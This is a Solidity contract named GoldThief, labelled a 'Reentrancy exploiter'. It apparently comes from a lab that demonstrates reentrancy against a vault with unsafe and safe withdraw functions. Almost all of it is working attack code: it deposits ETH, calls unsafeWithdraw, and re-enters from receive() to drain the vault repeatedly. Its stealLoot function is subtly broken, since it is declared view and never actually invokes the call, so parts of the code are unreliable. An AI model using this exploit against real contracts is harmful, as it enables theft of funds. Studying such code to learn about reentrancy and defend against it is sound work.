// SPDX-License-Identifier: MIT
pragma solidity ^0.8.31;

// Reentrancy exploiter

interface IVault {
    function deposit() external payable;
    function unsafeWithdraw() external;
    function safeWithdraw() external;
}

contract GoldThief {

    IVault public targetVault;
    address public owner;
    uint256 public attackCount;
    bool public attackingSafe;

    constructor(address _vaultAddress) {
        targetVault = IVault(_vaultAddress);
        owner = msg.sender;
    }

    function attackUnsafe() external payable {
        require(msg.sender == owner, "You are not the owner");
        require(msg.value >= 1 ether, "Need atleast 1 ETH");
        attackingSafe = false;
        attackCount = 0;
        targetVault.deposit{value: msg.value}();
        targetVault.unsafeWithdraw();
    }

    receive() external payable { 
        attackCount++;
        if(!attackingSafe && address(targetVault).balance >= 1 ether && attackCount < 5) {
            targetVault.unsafeWithdraw();
        }

        // Safe way
        if(attackingSafe) {
            targetVault.safeWithdraw();
        }
    }

    function attackSafe() external payable {
        require(msg.sender == owner, "You are not the owner");
        require(msg.value >= 1 ether, "Need atleast 1 ETH");
        attackingSafe = true;
        attackCount = 0;
        targetVault.deposit{value: msg.value}();
        targetVault.safeWithdraw();
    }

    function stealLoot() external view {
        require(msg.sender == owner, "You are not the owner");
        payable(owner).call{value: address(this).balance};
    }

    function getBalance() external view returns(uint256) {
        return address(this).balance;
    }
}